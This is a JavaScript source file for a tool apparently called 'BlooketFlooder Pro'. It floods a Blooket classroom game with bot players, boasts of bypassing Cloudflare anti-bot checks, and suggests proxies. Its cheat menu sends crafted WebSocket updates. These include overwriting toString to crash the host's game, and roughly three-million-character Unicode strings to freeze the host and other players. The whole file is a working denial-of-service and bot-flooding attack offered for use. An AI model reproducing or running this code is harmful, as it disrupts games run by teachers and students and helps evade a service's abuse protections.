import enquirer from 'enquirer';
import { bold, green, orange, purple, red, yellow } from '../common/color.js';
import cookieV2 from '../common/cookieV2.js';
import join from './join.js';

console.log(bold(yellow('BlooketFlooder Pro')));

if (typeof Bun === 'undefined') {
    console.error(red('❌ this script requires bun (https://bun.sh) to bypass cloudflare antibot'));
    process.exit(1);
}

console.log(purple('✨ this is the formerly private version with:'));
console.log(purple('  - 100% cloudflare bypass (no popup windows)'));
console.log(purple('  - instant join'));
console.log(purple('  - 60-70% less resources used\n'));

if (!process.env.PROXY) console.log(orange('⚠️  use a proxy for faster botting! see the README for more info\n'));

const isOctober = new Date().getMonth() === 9;
const isDecember = new Date().getMonth() === 11;
const unrewritten = [isOctober ? 'Candy Quest' : 'Gold Quest', 'Crypto Hack', 'Fishing Frenzy'];
if (isDecember) unrewritten.push('Santa\'s Workshop');

const isUsingLegacy = await enquirer.prompt({
    type: 'select',
    name: 'is',
    message: `Is your gamemode one of ${unrewritten.join(', ')}?`,
    choices: ['yes', 'no']
});

if (isUsingLegacy.is.startsWith('y')) {
    // continue with legacy flow
} else if (isUsingLegacy.is.startsWith('n')) {
    console.log('Beta mode not implemented in this file.');
    process.exit(0);
} else {
    console.log('idrk what you just put so the program has quit run it again and type yes or no next time');
    process.exit(1);
}

const config = await enquirer.prompt([
    { type: 'input', name: 'pin', message: 'Game Pin' },
    { type: 'input', name: 'name', message: 'Bot Name' },
    { type: 'input', name: 'amount', message: 'Bot Amount' }
]);

console.log(yellow('\nverifying game pin...'));

const { redirectUrl } = await cookieV2('https://play.blooket.com/play?id=' + config.pin, 'legacy1');
if (!redirectUrl) {
    console.log(red('Failed to verify game pin. Open an issue on Github if you believe this is an error.'));
    process.exit(1);
}

let mode = 'Unknown';
for (const [key, value] of Object.entries({
    cryptohack: 'Crypto Hack',
    santasworkshop: 'Santa\'s Workshop',
    goldquest: 'Gold Quest',
    fishingfrenzy: 'Fishing Frenzy'
})) {
    if (redirectUrl.includes(key)) {
        mode = value;
        break;
    }
}

console.log(green(`verified game pin! mode: ${mode}\n`));

let success = 0;
let fail = 0;
const bots = [];

console.log(yellow('Joining bots...'));

for (let i = 1; i <= config.amount; i++) {
    const botName = config.name + i;
    console.log(`Spawning bot ${botName}`);
    join(redirectUrl, config.pin, botName, (result, botObj) => {
        if (result === 2) {
            success++;
            bots.push(botObj);
            console.log(green(`✅ ${botName} joined (${success}/${config.amount})`));
        } else {
            fail++;
            console.log(red(`❌ ${botName} failed to join`));
        }

        if (success + fail === config.amount) {
            console.log(green(`\n${success}/${config.amount} bots joined successfully!`));
            askForCheats(bots, mode);
        }
    });

    if (!process.env.PROXY) await new Promise((r) => setTimeout(r, 300));
}

async function askForCheats(bots, mode) {
    console.log(yellow('\n--- Entering cheat selection ---'));
    const { useCheats } = await enquirer.prompt({
        type: 'confirm',
        name: 'useCheats',
        message: 'Do you want to execute a cheat using one of the bots?',
        initial: false
    });

    if (!useCheats) {
        console.log(yellow('No cheats selected. Exiting.'));
        for (const bot of bots) bot.ws.close();
        process.exit(0);
    }

    // Define cheats and their compatibility
    const cheats = [
        {
            name: 'Freeze Leaderboard',
            description: 'Prevents the host leaderboard from updating',
            action: (bot) => bot.sendUpdate(`c/${bot.name}/tat/Freeze`, 'freeze'),
            compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
        },
        {
            name: 'Crash Game',
            description: 'Crashes the host\'s game',
            action: (bot) => bot.sendUpdate(`c/${bot.name}/b/toString`, 'Crashed'),
            compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
        },
        {
            name: 'Freeze Host',
            description: 'Sends extremely long blook name to freeze host',
            action: (bot) => {
                const chars = ['\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'];
                const unicodeChars = chars.map(c => eval(`"${c}"`));
                const longText = new Array(3000000).fill().map(() => unicodeChars[Math.floor(Math.random() * unicodeChars.length)]).join('');
                bot.sendUpdate(`c/${bot.name}/b`, longText);
            },
            compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
        },
        {
            name: 'Set Blook Ad Text',
            description: 'Sets your blook to repeated text',
            inputs: [{ type: 'input', name: 'text', message: 'Enter text to repeat:' }],
            action: (bot, { text }) => {
                const repeated = Array(500).fill(text).join(' ');
                bot.sendUpdate(`c/${bot.name}/b`, repeated);
            },
            compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
        },
        {
            name: 'Set Host Screen Green',
            description: 'Fills host screen with text (Crypto Hack only)',
            action: (bot) => {
                const value = `9999999999999999999999999999999999999999999999${new Array(999).fill('\u0e47'.repeat(70)).join(' ')}`;
                bot.sendUpdate(`c/${bot.name}/cr`, value);
            },
            compatible: ['Crypto Hack']
        },
        {
            name: 'Crash Password',
            description: 'Crashes players who try to hack you (Crypto Hack only)',
            action: (bot) => bot.sendUpdate(`c/${bot.name}/p/toString`, 'crash'),
            compatible: ['Crypto Hack']
        },
        {
            name: 'Freeze Password',
            description: 'Freezes players who try to hack you (Crypto Hack only)',
            action: (bot) => {
                const chars = ['\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'];
                const unicodeChars = chars.map(c => eval(`"${c}"`));
                const longText = new Array(3000000).fill().map(() => unicodeChars[Math.floor(Math.random() * unicodeChars.length)]).join('');
                bot.sendUpdate(`c/${bot.name}/p`, longText);
            },
            compatible: ['Crypto Hack']
        }
    ];

    // Filter cheats compatible with current mode
    const availableCheats = cheats.filter(c => c.compatible.includes(mode));
    if (availableCheats.length === 0) {
        console.log(red(`No cheats available for mode: ${mode}`));
        for (const bot of bots) bot.ws.close();
        process.exit(0);
    }

    // Show cheat list
    console.log(yellow('\nAvailable cheats:'));
    for (let i = 0; i < availableCheats.length; i++) {
        const c = availableCheats[i];
        console.log(`${i + 1}. ${c.name} - ${c.description}`);
    }

    const { cheatIndex } = await enquirer.prompt({
        type: 'number',
        name: 'cheatIndex',
        message: 'Select a cheat (number)',
        validate: (val) => val >= 1 && val <= availableCheats.length ? true : 'Invalid number'
    });

    const selectedCheat = availableCheats[cheatIndex - 1];

    // Get any additional inputs
    let params = {};
    if (selectedCheat.inputs) {
        const inputPrompts = selectedCheat.inputs.map(inp => ({ ...inp, name: inp.name }));
        const inputs = await enquirer.prompt(inputPrompts);
        params = inputs;
    }

    // Choose bot
    console.log(yellow('\nBots:'));
    bots.forEach((bot, idx) => console.log(`${idx + 1}. ${bot.name}`));
    const { botIndex } = await enquirer.prompt({
        type: 'number',
        name: 'botIndex',
        message: 'Select a bot (number)',
        validate: (val) => val >= 1 && val <= bots.length ? true : 'Invalid number'
    });

    const selectedBot = bots[botIndex - 1];

    // Execute cheat
    console.log(yellow(`\nExecuting ${selectedCheat.name} on ${selectedBot.name}...`));
    try {
        await selectedCheat.action(selectedBot, params);
        console.log(green('Cheat executed successfully!'));
    } catch (err) {
        console.log(red(`Cheat execution failed: ${err.message}`));
    }

    // Close all bot WebSockets gracefully
    for (const bot of bots) {
        bot.ws.close();
    }
    process.exit(0);
}
